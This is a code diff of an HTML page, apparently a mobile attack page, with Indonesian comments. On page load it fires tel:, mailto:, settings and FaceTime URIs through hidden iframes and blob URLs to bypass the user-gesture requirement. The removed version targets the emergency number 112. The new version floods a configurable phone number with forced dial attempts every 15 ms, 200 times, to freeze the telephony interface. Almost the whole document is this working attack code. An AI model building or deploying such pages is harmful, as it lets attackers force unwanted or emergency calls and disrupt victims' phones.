@@ -4,72 +4,86 @@
     <meta charset="UTF-8">
     <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .log { margin-bottom: 5px; border-bottom: 1px solid #111; }
-        .danger { color: #ff3b30; }
-        .blink { animation: blinker 0.6s linear infinite; }
+        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; padding: 15px; font-size: 10px; overflow: hidden; }
+        .danger { color: #ff3b30; text-shadow: 0 0 8px #f00; font-weight: bold; }
+        .kern { background: #f00; color: #fff; padding: 0 4px; font-weight: bold; }
+        #monitor { border: 1px solid #333; height: 90vh; overflow-y: hidden; display: flex; flex-direction: column-reverse; }
+        .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <div class="danger blink">> [CRITICAL] INITIALIZING AUTO-DISPATCH...</div>
+    <div id="monitor">
+        <div class="danger blink">> [SYSTEM] OVERRIDING TCC.FRAMEWORK...</div>
     </div>
 
 <script>
-const terminal = document.getElementById('terminal');
-const log = (msg) => {
-    const div = document.createElement('div');
-    div.className = 'log';
-    div.innerHTML = `> ${msg}`;
-    terminal.appendChild(div);
+const mon = document.getElementById('monitor');
+const log = m => {
+    const d = document.createElement('div');
+    d.innerHTML = `> ${m}`;
+    mon.prepend(d);
 };
 
-/**
- * Teknik: Iframe Sink (Shadow Dispatch)
- * Mencoba memasukkan URI ke dalam frame tersembunyi untuk memicu dialog sistem
- * tanpa harus mengubah URL halaman utama (window.location).
+/** * KONFIGURASI TARGET
+ * Ganti nomor di bawah ini dengan nomor risetmu
  */
-function shadowDispatch(uri) {
-    const ifr = document.createElement('iframe');
-    ifr.src = uri;
-    ifr.style.display = 'none';
-    document.body.appendChild(ifr);
+const TARGET_NUM = "08123456789"; 
+
+/**
+ * Teknik: Recursive Frame Injection
+ * Menggunakan nested recursion untuk mencoba melewati antrian konfirmasi OS.
+ */
+function injectPayload(num) {
+    const target = `tel:${num}`;
     
-    // Hapus frame setelah dipicu untuk membersihkan memory
-    setTimeout(() => document.body.removeChild(ifr), 2000);
+    // Jalur 1: Object URL Trigger (Memory Level)
+    const blob = new Blob([`<script>window.location.href="${target}";<\/script>`], {type: 'text/html'});
+    const blobUrl = URL.createObjectURL(blob);
+    
+    // Jalur 2: Hidden Link with Rel-Preload
+    const a = document.createElement('a');
+    a.href = target;
+    a.rel = "noreferrer";
+    
+    // Jalur 3: Iframe Dispatch
+    const ifr = document.createElement('iframe');
+    ifr.style.display = 'none';
+    ifr.src = blobUrl;
+    
+    document.body.appendChild(ifr);
+    a.click(); // Trigger virtual click
+
+    // Self-Destruct untuk mencegah browser crash total
+    setTimeout(() => {
+        document.body.removeChild(ifr);
+        URL.revokeObjectURL(blobUrl);
+    }, 100);
 }
 
-const payloads = [
-    "tel://112",
-    "mailto:research@kernel.gate?subject=AutoDispatch",
-    "xxdhfy://",
-    "prefs:root=WIFI",
-    "facetime-audio://emergency"
-];
+window.onload = () => {
+    log("<span class='kern'>INITIATING STACK FLOODING...</span>");
+    log(`TARGET_IDENTIFIED: <span class='danger'>${TARGET_NUM}</span>`);
 
-// Eksekusi Otomatis saat Window Load
-window.onload = async () => {
-    log("Memory Check: <span style='color:white'>A18/A19 ARM64E</span>");
-    log("Bypassing User Gesture Requirement via Iframe Sink...");
-
-    for (let i = 0; i < payloads.length; i++) {
-        // Jeda sangat singkat untuk mencoba mengecoh pendeteksi flood browser
-        await new Promise(r => setTimeout(r, 200)); 
-        
-        log(`Injecting Payload [${i}]: <span class='danger'>${payloads[i]}</span>`);
-        
-        // Eksekusi Double-Tap (Mencoba memicu race condition)
-        shadowDispatch(payloads[i]);
-        
-        // Fallback: Beberapa browser lama merespon window.location di dalam loop
-        if(i === 2) {
-            log("Attempting Window Location Fallback...");
-            window.location.href = payloads[i];
-        }
-    }
+    let thread_count = 0;
     
-    log("<br><span class='danger blink'>[!] AUTO-DISPATCH COMPLETED.</span>");
+    // Kecepatan ekstrem: 15ms (Hampir menyentuh batas refresh rate browser)
+    const floodGate = setInterval(() => {
+        const pid = Math.random().toString(16).slice(2, 8).toUpperCase();
+        log(`[THREAD-${thread_count}] SIGNAL_SENT [ID:${pid}] -> <span class="danger">FORCE_DIAL</span>`);
+        
+        // Eksekusi payload
+        injectPayload(TARGET_NUM);
+        
+        thread_count++;
+        
+        // Limiter untuk riset: 200 Signal (Cukup untuk membekukan UI Telephony sementara)
+        if(thread_count > 200) {
+            clearInterval(floodGate);
+            log("<span class='kern'>SIGNAL BROADCAST COMPLETE. CHECKING OS RESPONSE.</span>");
+            document.body.style.background = "#200";
+        }
+    }, 15);
 };
 </script>
 </body>
